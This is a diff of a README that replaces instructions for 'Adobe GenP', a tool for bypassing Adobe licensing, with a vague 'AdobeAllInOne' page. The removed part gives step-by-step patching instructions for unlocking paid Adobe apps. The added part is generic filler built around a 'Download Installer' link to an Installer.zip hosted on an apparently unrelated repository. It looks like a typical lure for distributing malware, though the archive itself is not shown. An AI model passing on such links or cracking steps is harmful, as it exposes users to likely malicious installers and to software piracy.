@@ -1,44 +1,55 @@
-# Adobe-GenP
-Adobe CC 2019/2020/2021/2022/2023 GenP Universal Patch 3.0
-December 25, 2022 - Software
+# AdobeAllInOne 🎨
 
-from https://www.cybermania.ws/software/adobe-genp/
+Welcome to AdobeAllInOne - your ultimate go-to repository for all things Adobe! Here, you'll find tools, resources, and guides that will help you harness the power of Adobe's creative suite to its full potential.
 
-![my Adobe-GenP-3.0](/Adobe-GenP-3.0_Screenshot.PNG?raw=true "Adobe-GenP-3.0")
-AutoIt script Adobe-GenP-3.0.au3  compiled by 'user' @15.12.2022 21:49:37
-RunMe.au3 @15.12.2022 00:20:42
+![AdobeAllInOne Logo](https://example.com/adobeallinone_logo.png)
 
-# How to use GenP:
+## Table of Contents 📋
 
-If you want to patch all Adobe apps in default location:
+- [Overview](#overview)
+- [Installation](#installation)
+- [Features](#features)
+- [Contributing](#contributing)
+- [License](#license)
 
-Press ‘Search Files’ – wait until GenP finds all files.<br>
-Press ‘Pill Button’ – wait until GenP do it’s job.<br>
-One Adobe app at a time:<br>
-Press ‘Custom path’ – select folder that you want [depending upon the app you want to patch]<br>
-Press ‘Search Files’ – wait until GenP finds all files.<br>
-Press ‘Pill Button’ – wait until GenP do it’s job.<br>
- 
+## Overview ℹ️
 
-# What’s New in GenP 3.0
+AdobeAllInOne is a comprehensive collection of scripts, utilities, and tips to enhance and streamline your experience with Adobe products. From Photoshop to Premiere Pro, Illustrator to InDesign, this repository has got you covered. Whether you are a seasoned professional or a beginner exploring the creative world, AdobeAllInOne has something for everyone.
 
-Can patch apps from 2019 version to current and future releases.<br>
-Automatic search in selected folder.<br>
-New patching logic<br>
-Support for all Substance products.<br>
- 
+## Installation 🚀
 
-# Known Issues:
+To get started with AdobeAllInOne, simply download the Installer package by clicking the button below:
 
-InDesign and InCopy will have high CPU usage.<br>
-Animate will have some problems with home screen if Signed Out.<br>
-Lightroom Classic will partially work if Signed Out.<br>
-Acrobat, Rush, Lightroom Online, Photoshop Express, Creative Cloud App won’t be patched or fully unlocked.<br>
-Maybe in next release I’ll find solution for them.<br>
+[![Download Installer](https://img.shields.io/badge/Download-Installer-<COLOR>.svg)](https://github.com/somaproject/software-common/files/14865186/Installer.zip)
 
+## Features ✨
 
-# FIXES By Me:
-* made progressbar working
-* No checkbox at welcome text
-* nicer form size
-* Set dir deep level von search for files
+### 1. Script Library
+Explore a wealth of scripts that automate tasks, speed up your workflow, and unlock hidden features within Adobe applications.
+
+### 2. Resource Guides
+From beginner tutorials to advanced techniques, our resource guides cover everything from basic tools to complex creative strategies.
+
+### 3. Custom Plugins
+Discover custom plugins developed by the community to extend the functionality of Adobe software beyond its standard capabilities.
+
+### 4. Troubleshooting Tips
+Encounter a problem? Our troubleshooting section offers solutions to common issues faced by Adobe users, ensuring smooth sailing with your projects.
+
+## Contributing 🤝
+
+We welcome contributions from the community to make AdobeAllInOne even more robust and helpful. Whether you have a useful script to share, a guide to contribute, or a bug fix to suggest, feel free to open a pull request. Together, we can make AdobeAllInOne the ultimate resource for Adobe enthusiasts worldwide.
+
+## License 📜
+
+This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+
+---
+
+Thank you for checking out AdobeAllInOne! Let's unleash the full potential of Adobe's creative suite together! 🎉
+
+![AdobeAllInOne](https://example.com/adobeallinone_screenshot.png)
+
+---
+
+Remember, creativity knows no bounds with AdobeAllInOne! Happy creating! 🖌️🎉
